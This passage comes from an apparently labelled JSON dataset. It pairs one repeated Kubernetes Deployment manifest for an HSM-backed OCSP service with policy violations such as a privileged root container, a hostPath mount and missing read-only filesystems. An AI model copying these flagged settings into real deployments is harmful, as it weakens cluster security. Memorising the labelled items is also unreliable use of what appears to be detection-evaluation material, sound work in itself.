mountPath: /var/run/pcscd/\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"app-hsmocsp\" does not have a read-only root file system"
  },
  {
    "id": "8892",
    "manifest_path": "data/manifests/the_stack_sample/sample_3357.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app-hsmocsp\n  namespace: default\n  labels:\n    app.kubernetes.io/name: app-hsmocsp\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: app-hsmocsp\n      app.kubernetes.io/name: app-hsmocsp\n  template:\n    metadata:\n      labels:\n        app: app-hsmocsp\n        app.kubernetes.io/name: app-hsmocsp\n      annotations: {}\n    spec:\n      affinity: {}\n      serviceAccountName: app-hsmocsp\n      securityContext:\n        fsGroup: 1000\n      volumes:\n      - name: app-hsmocsp-pcscd-volume\n        hostPath:\n          path: /var/run/pcscd/\n          type: ''\n      - name: app-hsmocsp-config\n        configMap:\n          name: app-hsmocsp-config\n      - name: app-hsmocsp-pki-config\n        configMap:\n          name: app-hsmocsp-pki-config\n      - name: app-hsmocsp-vault-config\n        configMap:\n          name: app-hsmocsp-vault-config\n      - name: app-hsmocsp-softhsm2-config\n        configMap:\n          name: app-hsmocsp-softhsm2-config\n      - name: app-hsmocsp-pki-volume\n        emptyDir: {}\n      - name: app-hsmocsp-softhsm2-token-volume\n        emptyDir: {}\n      containers:\n      - name: app-hsmocsp-pki\n        image: app-pki\n        args:\n        - init\n        command:\n        - /app/scripts/pki-entrypoint.sh\n        env:\n        - name: OPENSSL_CA_DIR\n          value: /app/.config/pki\n        - name: VAULT_ADDR\n          value: http://127.0.0.1:8200\n        - name: HSM_PIN\n          valueFrom:\n            secretKeyRef:\n              name: app-hsmocsp-secret\n              key: pin\n        - name: HSM_SOPIN\n          valueFrom:\n            secretKeyRef:\n              name: app-hsmocsp-secret\n              key: sopin\n        - name: K8S_TOKEN_REVIEWER_JWT\n          valueFrom:\n            secretKeyRef:\n              name: vault-auth-secret\n              key: token\n        - name: K8S_CA_CRT\n          valueFrom:\n            secretKeyRef:\n              name: vault-auth-secret\n              key: ca.crt\n        volumeMounts:\n        - name: app-hsmocsp-softhsm2-token-volume\n          mountPath: /app/.config/softhsm2/tokens\n        - name: app-hsmocsp-softhsm2-config\n          mountPath: /app/.config/softhsm2/softhsm2.conf\n          subPath: softhsm2.conf\n        - name: app-hsmocsp-pki-volume\n          mountPath: /app/.config/pki\n        - name: app-hsmocsp-pki-config\n          mountPath: /app/.config/pki/ca.conf\n          subPath: ca.conf\n        - mountPath: /app/.config/vault/vault-agent-config.hcl\n          name: app-hsmocsp-vault-config\n          subPath: vault-agent-config.hcl\n        resources:\n          limits:\n            cpu: 200m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n      - name: app-hsmocsp\n        image: app-hsmocsp\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8080\n          name: http\n          protocol: TCP\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: http\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: http\n        startupProbe:\n          httpGet:\n            path: /healthz\n            port: http\n          failureThreshold: 2\n          periodSeconds: 15\n        resources:\n          limits:\n            cpu: 200m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n        args:\n        - -config\n        - /app/.config/hsmocsp/config.yaml\n        command:\n        - /app/app-hsmocsp\n        env:\n        - name: HSM_PIN\n          valueFrom:\n            secretKeyRef:\n              name: app-hsmocsp-secret\n              key: pin\n        volumeMounts:\n        - name: app-hsmocsp-config\n          mountPath: /app/.config/hsmocsp/config.yaml\n          subPath: config.yaml\n        - name: app-hsmocsp-pki-volume\n          mountPath: /app/.config/pki\n        - name: app-hsmocsp-softhsm2-token-volume\n          mountPath: /app/.config/softhsm2/tokens\n        - name: app-hsmocsp-softhsm2-config\n          mountPath: /app/.config/softhsm2/softhsm2.conf\n          subPath: softhsm2.conf\n        - name: app-hsmocsp-pcscd-volume\n          mountPath: /var/run/pcscd/\n      - name: app-hsmocsp-pcscd\n        image: app-pki\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            cpu: 200m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n        securityContext:\n          privileged: true\n          procMount: Default\n          runAsUser: 0\n        args:\n        - pcscd\n        command:\n        - /app/scripts/pki-entrypoint.sh\n        volumeMounts:\n        - name: app-hsmocsp-pcscd-volume\n          mountPath: /var/run/pcscd/\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"app-hsmocsp-pcscd\" does not have a read-only root file system"
  },
  {
    "id": "8893",
    "manifest_path": "data/manifests/the_stack_sample/sample_3357.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app-hsmocsp\n  namespace: default\n  labels:\n    app.kubernetes.io/name: app-hsmocsp\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: app-hsmocsp\n      app.kubernetes.io/name: app-hsmocsp\n  template:\n    metadata:\n      labels:\n        app: app-hsmocsp\n        app.kubernetes.io/name: app-hsmocsp\n      annotations: {}\n    spec:\n      affinity: {}\n      serviceAccountName: app-hsmocsp\n      securityContext:\n        fsGroup: 1000\n      volumes:\n      - name: app-hsmocsp-pcscd-volume\n        hostPath:\n          path: /var/run/pcscd/\n          type: ''\n      - name: app-hsmocsp-config\n        configMap:\n          name: app-hsmocsp-config\n      - name: app-hsmocsp-pki-config\n        configMap:\n          name: app-hsmocsp-pki-config\n      - name: app-hsmocsp-vault-config\n        configMap:\n          name: app-hsmocsp-vault-config\n      - name: app-hsmocsp-softhsm2-config\n        configMap:\n          name: app-hsmocsp-softhsm2-config\n      - name: app-hsmocsp-pki-volume\n        emptyDir: {}\n      - name: app-hsmocsp-softhsm2-token-volume\n        emptyDir: {}\n      containers:\n      - name: app-hsmocsp-pki\n        image: app-pki\n        args:\n        - init\n        command:\n        - /app/scripts/pki-entrypoint.sh\n        env:\n        - name: OPENSSL_CA_DIR\n          value: /app/.config/pki\n        - name: VAULT_ADDR\n          value: http://127.0.0.1:8200\n        - name: HSM_PIN\n          valueFrom:\n            secretKeyRef:\n              name: app-hsmocsp-secret\n              key: pin\n        - name: HSM_SOPIN\n          valueFrom:\n            secretKeyRef:\n              name: app-hsmocsp-secret\n              key: sopin\n        - name: K8S_TOKEN_REVIEWER_JWT\n          valueFrom:\n            secretKeyRef:\n              name: vault-auth-secret\n              key: token\n        - name: K8S_CA_CRT\n          valueFrom:\n            secretKeyRef:\n              name: vault-auth-secret\n              key: ca.crt\n        volumeMounts:\n        - name: app-hsmocsp-softhsm2-token-volume\n          mountPath: /app/.config/softhsm2/tokens\n        - name: app-hsmocsp-softhsm2-config\n          mountPath: /app/.config/softhsm2/softhsm2.conf\n          subPath: softhsm2.conf\n        - name: app-hsmocsp-pki-volume\n          mountPath: /app/.config/pki\n        - name: app-hsmocsp-pki-config\n          mountPath: /app/.config/pki/ca.conf\n          subPath: ca.conf\n        - mountPath: /app/.config/vault/vault-agent-config.hcl\n          name: app-hsmocsp-vault-config\n          subPath: vault-agent-config.hcl\n        resources:\n          limits:\n            cpu: 200m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n      - name: app-hsmocsp\n        image: app-hsmocsp\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8080\n          name: http\n          protocol: TCP\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: http\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: http\n        startupProbe:\n          httpGet:\n            path: /healthz\n            port: http\n          failureThreshold: 2\n          periodSeconds: 15\n        resources:\n          limits:\n            cpu: 200m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n        args:\n        - -config\n        - /app/.config/hsmocsp/config.yaml\n        command:\n        - /app/app-hsmocsp\n        env:\n        - name: HSM_PIN\n          valueFrom:\n            secretKeyRef:\n              name: app-hsmocsp-secret\n              key: pin\n        volumeMounts:\n        - name: app-hsmocsp-config\n          mountPath: /app/.config/hsmocsp/config.yaml\n          subPath: config.yaml\n        - name: app-hsmocsp-pki-volume\n          mountPath: /app/.config/pki\n        - name: app-hsmocsp-softhsm2-token-volume\n          mountPath: /app/.config/softhsm2/tokens\n        - name: app-hsmocsp-softhsm2-config\n          mountPath: /app/.config/softhsm2/softhsm2.conf\n          subPath: softhsm2.conf\n        - name: app-hsmocsp-pcscd-volume\n          mountPath: /var/run/pcscd/\n      - name: app-hsmocsp-pcscd\n        image: app-pki\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            cpu: 200m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n        securityContext:\n          privileged: true\n          procMount: Default\n          runAsUser: 0\n        args:\n        - pcscd\n        command:\n        - /app/scripts/pki-entrypoint.sh\n        volumeMounts:\n        - name: app-hsmocsp-pcscd-volume\n          mountPath: /var/run/pcscd/\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"app-hsmocsp-pki\" does not have a read-only root file system"
  },
  {
    "id": "8894",
    "manifest_path": "data/manifests/the_stack_sample/sample_3357.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app-hsmocsp\n  namespace: default\n  labels:\n    app.kubernetes.io/name: app-hsmocsp\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: app-hsmocsp\n      app.kubernetes.io/name: app-hsmocsp\n  template:\n    metadata:\n      labels:\n        app: app-hsmocsp\n        app.kubernetes.io/name: app-hsmocsp\n      annotations: {}\n    spec:\n      affinity: {}\n      serviceAccountName: app-hsmocsp\n      securityContext:\n        fsGroup: 1000\n      volumes:\n      - name: app-hsmocsp-pcscd-volume\n        hostPath:\n          path: /var/run/pcscd/\n          type: ''\n      - name: app-hsmocsp-config\n        configMap:\n          name: app-hsmocsp-config\n      - name: app-hsmocsp-pki-config\n        configMap:\n          name: app-hsmocsp-pki-config\n      - name: app-hsmocsp-vault-config\n        configMap:\n          name: app-hsmocsp-vault-config\n      - name: app-hsmocsp-softhsm2-config\n        configMap:\n          name: app-hsmocsp-softhsm2-config\n      - name: app-hsmocsp-pki-volume\n        emptyDir: {}\n      - name: app-hsmocsp-softhsm2-token-volume\n        emptyDir: {}\n      containers:\n      - name: app-hsmocsp-pki\n        image: app-pki\n        args:\n        - init\n        command:\n        - /app/scripts/pki-entrypoint.sh\n        env:\n        - name: OPENSSL_CA_DIR\n          value: /app/.config/pki\n        - name: VAULT_ADDR\n          value: http://127.0.0.1:8200\n        - name: HSM_PIN\n          valueFrom:\n            secretKeyRef:\n              name: app-hsmocsp-secret\n              key: pin\n        - name: HSM_SOPIN\n          valueFrom:\n            secretKeyRef:\n              name: app-hsmocsp-secret\n              key: sopin\n        - name: K8S_TOKEN_REVIEWER_JWT\n          valueFrom:\n            secretKeyRef:\n              name: vault-auth-secret\n              key: token\n        - name: K8S_CA_CRT\n          valueFrom:\n            secretKeyRef:\n              name: vault-auth-secret\n              key: ca.crt\n        volumeMounts:\n        - name: app-hsmocsp-softhsm2-token-volume\n          mountPath: /app/.config/softhsm2/tokens\n        - name: app-hsmocsp-softhsm2-config\n          mountPath: /app/.config/softhsm2/softhsm2.conf\n          subPath: softhsm2.conf\n        - name: app-hsmocsp-pki-volume\n          mountPath: /app/.config/pki\n        - name: app-hsmocsp-pki-config\n          mountPath: /app/.config/pki/ca.conf\n          subPath: ca.conf\n        - mountPath: /app/.config/vault/vault-agent-config.hcl\n          name: app-hsmocsp-vault-config\n          subPath: vault-agent-config.hcl\n        resources:\n          limits:\n            cpu: 200m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n      - name: app-hsmocsp\n        image: app-hsmocsp\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8080\n          name: http\n          protocol: TCP\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: http\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: http\n        startupProbe:\n          httpGet:\n            path: /healthz\n            port: http\n          failureThreshold: 2\n          periodSeconds: 15\n        resources:\n          limits:\n            cpu: 200m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n        args:\n        - -config\n        - /app/.config/hsmocsp/config.yaml\n        command:\n        - /app/app-hsmocsp\n        env:\n        - name: HSM_PIN\n          valueFrom:\n            secretKeyRef:\n              name: app-hsmocsp-secret\n              key: pin\n        volumeMounts:\n        - name: app-hsmocsp-config\n          mountPath: /app/.config/hsmocsp/config.yaml\n          subPath: config.yaml\n        - name: app-hsmocsp-pki-volume\n          mountPath: /app/.config/pki\n        - name: app-hsmocsp-softhsm2-token-volume\n          mountPath: /app/.config/softhsm2/tokens\n        - name: app-hsmocsp-softhsm2-config\n          mountPath: /app/.config/softhsm2/softhsm2.conf\n          subPath: softhsm2.conf\n        - name: app-hsmocsp-pcscd-volume\n          mountPath: /var/run/pcscd/\n      - name: app-hsmocsp-pcscd\n        image: app-pki\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            cpu: 200m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n        securityContext:\n          privileged: true\n          procMount: Default\n          runAsUser: 0\n        args:\n        - pcscd\n        command:\n        - /app/scripts/pki-entrypoint.sh\n        volumeMounts:\n        - name: app-hsmocsp-pcscd-volume\n          mountPath: /var/run/pcscd/\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"app-hsmocsp\" not found"
  },
  {
    "id": "8895",
    "manifest_path": "data/manifests/the_stack_sample/sample_3357.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app-hsmocsp\n  namespace: default\n  labels:\n    app.kubernetes.io/name: app-hsmocsp\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: app-hsmocsp\n      app.kubernetes.io/name: app-hsmocsp\n  template:\n    metadata:\n      labels:\n        app: app-hsmocsp\n        app.kubernetes.io/name: app-hsmocsp\n      annotations: {}\n    spec:\n      affinity: {}\n      serviceAccountName: app-hsmocsp\n      securityContext:\n        fsGroup: 1000\n      volumes:\n      - name: app-hsmocsp-pcscd-volume\n        hostPath:\n          path: /var/run/pcscd/\n          type: ''\n      - name: app-hsmocsp-config\n        configMap:\n          name: app-hsmocsp-config\n      - name: app-hsmocsp-pki-config\n        configMap:\n          name: app-hsmocsp-pki-config\n      - name: app-hsmocsp-vault-config\n        configMap:\n          name: app-hsmocsp-vault-config\n      - name: app-hsmocsp-softhsm2-config\n        configMap:\n          name: app-hsmocsp-softhsm2-config\n      - name: app-hsmocsp-pki-volume\n        emptyDir: {}\n      - name: app-hsmocsp-softhsm2-token-volume\n        emptyDir: {}\n      containers:\n      - name: app-hsmocsp-pki\n        image: app-pki\n        args:\n        - init\n        command:\n        - /app/scripts/pki-entrypoint.sh\n        env:\n        - name: OPENSSL_CA_DIR\n          value: /app/.config/pki\n        - name: VAULT_ADDR\n          value: http://127.0.0.1:8200\n        - name: HSM_PIN\n          valueFrom:\n            secretKeyRef:\n              name: app-hsmocsp-secret\n              key: pin\n        - name: HSM_SOPIN\n          valueFrom:\n            secretKeyRef:\n              name: app-hsmocsp-secret\n              key: sopin\n        - name: K8S_TOKEN_REVIEWER_JWT\n          valueFrom:\n            secretKeyRef:\n              name: vault-auth-secret\n              key: token\n        - name: K8S_CA_CRT\n          valueFrom:\n            secretKeyRef:\n              name: vault-auth-secret\n              key: ca.crt\n        volumeMounts:\n        - name: app-hsmocsp-softhsm2-token-volume\n          mountPath: /app/.config/softhsm2/tokens\n        - name: app-hsmocsp-softhsm2-config\n          mountPath: /app/.config/softhsm2/softhsm2.conf\n          subPath: softhsm2.conf\n        - name: app-hsmocsp-pki-volume\n          mountPath: /app/.config/pki\n        - name: app-hsmocsp-pki-config\n          mountPath: /app/.config/pki/ca.conf\n          subPath: ca.conf\n        - mountPath: /app/.config/vault/vault-agent-config.hcl\n          name: app-hsmocsp-vault-config\n          subPath: vault-agent-config.hcl\n        resources:\n          limits:\n            cpu: 200m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n      - name: app-hsmocsp\n        image: app-hsmocsp\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8080\n          name: http\n          protocol: TCP\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: http\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: http\n        startupProbe:\n          httpGet:\n            path: /healthz\n            port: http\n          failureThreshold: 2\n          periodSeconds: 15\n        resources:\n          limits:\n            cpu: 200m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n        args:\n        - -config\n        - /app/.config/hsmocsp/config.yaml\n        command:\n        - /app/app-hsmocsp\n        env:\n        - name: HSM_PIN\n          valueFrom:\n            secretKeyRef:\n              name: app-hsmocsp-secret\n              key: pin\n        volumeMounts:\n        - name: app-hsmocsp-config\n          mountPath: /app/.config/hsmocsp/config.yaml\n          subPath: config.yaml\n        - name: app-hsmocsp-pki-volume\n          mountPath: /app/.config/pki\n        - name: app-hsmocsp-softhsm2-token-volume\n          mountPath: /app/.config/softhsm2/tokens\n        - name: app-hsmocsp-softhsm2-config\n          mountPath: /app/.config/softhsm2/softhsm2.conf\n          subPath: softhsm2.conf\n        - name: app-hsmocsp-pcscd-volume\n          mountPath: /var/run/pcscd/\n      - name: app-hsmocsp-pcscd\n        image: app-pki\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            cpu: 200m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n        securityContext:\n          privileged: true\n          procMount: Default\n          runAsUser: 0\n        args:\n        - pcscd\n        command:\n        - /app/scripts/pki-entrypoint.sh\n        volumeMounts:\n        - name: app-hsmocsp-pcscd-volume\n          mountPath: /var/run/pcscd/\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"app-hsmocsp-pcscd\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "8896",
    "manifest_path": "data/manifests/the_stack_sample/sample_3357.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app-hsmocsp\n  namespace: default\n  labels:\n    app.kubernetes.io/name: app-hsmocsp\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: app-hsmocsp\n      app.kubernetes.io/name: app-hsmocsp\n  template:\n    metadata:\n      labels:\n        app: app-hsmocsp\n        app.kubernetes.io/name: app-hsmocsp\n      annotations: {}\n    spec:\n      affinity: {}\n      serviceAccountName: app-hsmocsp\n      securityContext:\n        fsGroup: 1000\n      volumes:\n      - name: app-hsmocsp-pcscd-volume\n        hostPath:\n          path: /var/run/pcscd/\n          type: ''\n      - name: app-hsmocsp-config\n        configMap:\n          name: app-hsmocsp-config\n      - name: app-hsmocsp-pki-config\n        configMap:\n          name: app-hsmocsp-pki-config\n      - name: app-hsmocsp-vault-config\n        configMap:\n          name: app-hsmocsp-vault-config\n      - name: app-hsmocsp-softhsm2-config\n        configMap:\n          name: app-hsmocsp-softhsm2-config\n      - name: app-hsmocsp-pki-volume\n        emptyDir: {}\n      - name: app-hsmocsp-softhsm2-token-volume\n        emptyDir: {}\n      containers:\n      - name: app-hsmocsp-pki\n        image: app-pki\n        args:\n        - init\n        command:\n        - /app/scripts/pki-entrypoint.sh\n        env:\n        - name: OPENSSL_CA_DIR\n          value: /app/.config/pki\n        - name: VAULT_ADDR\n          value: http://127.0.0.1:8200\n        - name: HSM_PIN\n          valueFrom:\n            secretKeyRef:\n              name: app-hsmocsp-secret\n              key: pin\n        - name: HSM_SOPIN\n          valueFrom:\n            secretKeyRef:\n              name: app-hsmocsp-secret\n              key: sopin\n        - name: K8S_TOKEN_REVIEWER_JWT\n          valueFrom:\n            secretKeyRef:\n              name: vault-auth-secret\n              key: token\n        - name: K8S_CA_CRT\n          valueFrom:\n            secretKeyRef:\n              name: vault-auth-secret\n              key: ca.crt\n        volumeMounts:\n        - name: app-hsmocsp-softhsm2-token-volume\n          mountPath: /app/.config/softhsm2/tokens\n        - name: app-hsmocsp-softhsm2-config\n          mountPath: /app/.config/softhsm2/softhsm2.conf\n          subPath: softhsm2.conf\n        - name: app-hsmocsp-pki-volume\n          mountPath: /app/.config/pki\n        - name: app-hsmocsp-pki-config\n          mountPath: /app/.config/pki/ca.conf\n          subPath: ca.conf\n        - mountPath: /app/.config/vault/vault-agent-config.hcl\n          name: app-hsmocsp-vault-config\n          subPath: vault-agent-config.hcl\n        resources:\n          limits:\n            cpu: 200m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n      - name: app-hsmocsp\n        image: app-hsmocsp\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8080\n          name: http\n          protocol: TCP\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: http\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: http\n        startupProbe:\n          httpGet:\n            path: /healthz\n            port: http\n          failureThreshold: 2\n          periodSeconds: 15\n        resources:\n          limits:\n            cpu: 200m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n        args:\n        - -config\n        - /app/.config/hsmocsp/config.yaml\n        command:\n        - /app/app-hsmocsp\n        env:\n        - name: HSM_PIN\n          valueFrom:\n            secretKeyRef:\n              name: app-hsmocsp-secret\n              key: pin\n        volumeMounts:\n        - name: app-hsmocsp-config\n          mountPath: /app/.config/hsmocsp/config.yaml\n          subPath: config.yaml\n        - name: app-hsmocsp-pki-volume\n          mountPath: /app/.config/pki\n        - name: app-hsmocsp-softhsm2-token-volume\n          mountPath: /app/.config/softhsm2/tokens\n        - name: app-hsmocsp-softhsm2-config\n          mountPath: /app/.config/softhsm2/softhsm2.conf\n          subPath: softhsm2.conf\n        - name: app-hsmocsp-pcscd-volume\n          mountPath: /var/run/pcscd/\n      - name: app-hsmocsp-pcscd\n        image: app-pki\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            cpu: 200m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n        securityContext:\n          privileged: true\n          procMount: Default\n          runAsUser: 0\n        args:\n        - pcscd\n        command:\n        - /app/scripts/pki-entrypoint.sh\n        volumeMounts:\n        - name: app-hsmocsp-pcscd-volume\n          mountPath: /var/run/pcscd/\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"app-hsmocsp-pcscd\" is privileged"
  },
  {
    "id": "8897",
    "manifest_path": "data/manifests/the_stack_sample/sample_3357.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app-hsmocsp\n  namespace: default\n  labels:\n    app.kubernetes.io/name: app-hsmocsp\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: app-hsmocsp\n      app.kubernetes.io/name: app-hsmocsp\n  template:\n    metadata:\n      labels:\n        app: app-hsmocsp\n        app.kubernetes.io/name: app-hsmocsp\n      annotations: {}\n    spec:\n      affinity: {}\n      serviceAccountName: app-hsmocsp\n      securityContext:\n        fsGroup: 1000\n      volumes:\n      - name: app-hsmocsp-pcscd-volume\n        hostPath:\n          path: /var/run/pcscd/\n          type: ''\n      - name: app-hsmocsp-config\n        configMap:\n          name: app-hsmocsp-config\n      - name: app-hsmocsp-pki-config\n        configMap:\n          name: app-hsmocsp-pki-config\n      - name: app-hsmocsp-vault-config\n        configMap:\n          name: app-hsmocsp-vault-config\n      - name: app-hsmocsp-softhsm2-config\n        configMap:\n          name: app-hsmocsp-softhsm2-config\n      - name: app-hsmocsp-pki-volume\n        emptyDir: {}\n      - name: app-hsmocsp-softhsm2-token-volume\n        emptyDir: {}\n      containers:\n      - name: app-hsmocsp-pki\n        image: app-pki\n        args:\n        - init\n        command:\n        - /app/scripts/pki-entrypoint.sh\n        env:\n        - name: OPENSSL_CA_DIR\n          value: /app/.config/pki\n        - name: VAULT_ADDR\n          value: http://127.0.0.1:8200\n        - name: HSM_PIN\n          valueFrom:\n            secretKeyRef:\n              name: app-hsmocsp-secret\n              key: pin\n        - name: HSM_SOPIN\n          valueFrom:\n            secretKeyRef:\n              name: app-hsmocsp-secret\n              key: sopin\n        - name: K8S_TOKEN_REVIEWER_JWT\n          valueFrom:\n            secretKeyRef:\n              name: vault-auth-secret\n              key: token\n        - name: K8S_CA_CRT\n          valueFrom:\n            secretKeyRef:\n              name: vault-auth-secret\n              key: ca.crt\n        volumeMounts:\n        - name: app-hsmocsp-softhsm2-token-volume\n          mountPath: /app/.config/softhsm2/tokens\n        - name: app-hsmocsp-softhsm2-config\n          mountPath: /app/.config/softhsm2/softhsm2.conf\n          subPath: softhsm2.conf\n        - name: app-hsmocsp-pki-volume\n          mountPath: /app/.config/pki\n        - name: app-hsmocsp-pki-config\n          mountPath: /app/.config/pki/ca.conf\n          subPath: ca.conf\n        - mountPath: /app/.config/vault/vault-agent-config.hcl\n          name: app-hsmocsp-vault-config\n          subPath: vault-agent-config.hcl\n        resources:\n          limits:\n            cpu: 200m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n      - name: app-hsmocsp\n        image: app-hsmocsp\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8080\n          name: http\n          protocol: TCP\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: http\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: http\n        startupProbe:\n          httpGet:\n            path: /healthz\n            port: http\n          failureThreshold: 2\n          periodSeconds: 15\n        resources:\n          limits:\n            cpu: 200m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n        args:\n        - -config\n        - /app/.config/hsmocsp/config.yaml\n        command:\n        - /app/app-hsmocsp\n        env:\n        - name: HSM_PIN\n          valueFrom:\n            secretKeyRef:\n              name: app-hsmocsp-secret\n              key: pin\n        volumeMounts:\n        - name: app-hsmocsp-config\n          mountPath: /app/.config/hsmocsp/config.yaml\n          subPath: config.yaml\n        - name: app-hsmocsp-pki-volume\n          mountPath: /app/.config/pki\n        - name: app-hsmocsp-softhsm2-token-volume\n          mountPath: /app/.config/softhsm2/tokens\n        - name: app-hsmocsp-softhsm2-config\n          mountPath: /app/.config/softhsm2/softhsm2.conf\n          subPath: softhsm2.conf\n        - name: app-hsmocsp-pcscd-volume\n          mountPath: /var/run/pcscd/\n      - name: app-hsmocsp-pcscd\n        image: app-pki\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            cpu: 200m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n        securityContext:\n          privileged: true\n          procMount: Default\n          runAsUser: 0\n        args:\n        - pcscd\n        command:\n        - /app/scripts/pki-entrypoint.sh\n        volumeMounts:\n        - name: app-hsmocsp-pcscd-volume\n          mountPath: /var/run/pcscd/\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"app-hsmocsp\" is not set to runAsNonRoot"
  },
  {
    "id": "8898",
    "manifest_path": "data/manifests/the_stack_sample/sample_3357.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app-hsmocsp\n  namespace: default\n  labels:\n    app.kubernetes.io/name: app-hsmocsp\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: app-hsmocsp\n      app.kubernetes.io/name: app-hsmocsp\n  template:\n    metadata:\n      labels:\n        app: app-hsmocsp\n        app.kubernetes.io/name: app-hsmocsp\n      annotations: {}\n    spec:\n      affinity: {}\n      serviceAccountName: app-hsmocsp\n      securityContext:\n        fsGroup: 1000\n      volumes:\n      - name: app-hsmocsp-pcscd-volume\n        hostPath:\n          path: /var/run/pcscd/\n          type: ''\n      - name: app-hsmocsp-config\n        configMap:\n          name: app-hsmocsp-config\n      - name: app-hsmocsp-pki-config\n        configMap:\n          name: app-hsmocsp-pki-config\n      - name: app-hsmocsp-vault-config\n        configMap:\n          name: app-hsmocsp-vault-config\n      - name: app-hsmocsp-softhsm2-config\n        configMap:\n          name: app-hsmocsp-softhsm2-config\n      - name: app-hsmocsp-pki-volume\n        emptyDir: {}\n      - name: app-hsmocsp-softhsm2-token-volume\n        emptyDir: {}\n      containers:\n      - name: app-hsmocsp-pki\n        image: app-pki\n        args:\n        - init\n        command:\n        - /app/scripts/pki-entrypoint.sh\n        env:\n        - name: OPENSSL_CA_DIR\n          value: /app/.config/pki\n        - name: VAULT_ADDR\n          value: http://127.0.0.1:8200\n        - name: HSM_PIN\n          valueFrom:\n            secretKeyRef:\n              name: app-hsmocsp-secret\n              key: pin\n        - name: HSM_SOPIN\n          valueFrom:\n            secretKeyRef:\n              name: app-hsmocsp-secret\n              key: sopin\n        - name: K8S_TOKEN_REVIEWER_JWT\n          valueFrom:\n            secretKeyRef:\n              name: vault-auth-secret\n              key: token\n        - name: K8S_CA_CRT\n          valueFrom:\n            secretKeyRef:\n              name: vault-auth-secret\n              key: ca.crt\n        volumeMounts:\n        - name: app-hsmocsp-softhsm2-token-volume\n          mountPath: /app/.config/softhsm2/tokens\n        - name: app-hsmocsp-softhsm2-config\n          mountPath: /app/.config/softhsm2/softhsm2.conf\n          subPath: softhsm2.conf\n        - name: app-hsmocsp-pki-volume\n          mountPath: /app/.config/pki\n        - name: app-hsmocsp-pki-config\n          mountPath: /app/.config/pki/ca.conf\n          subPath: ca.conf\n        - mountPath: /app/.config/vault/vault-agent-config.hcl\n          name: app-hsmocsp-vault-config\n          subPath: vault-agent-config.hcl\n        resources:\n          limits:\n            cpu: 200m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n      - name: app-hsmocsp\n        image: app-hsmocsp\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8080\n          name: http\n          protocol: TCP\n        readinessProbe:\n          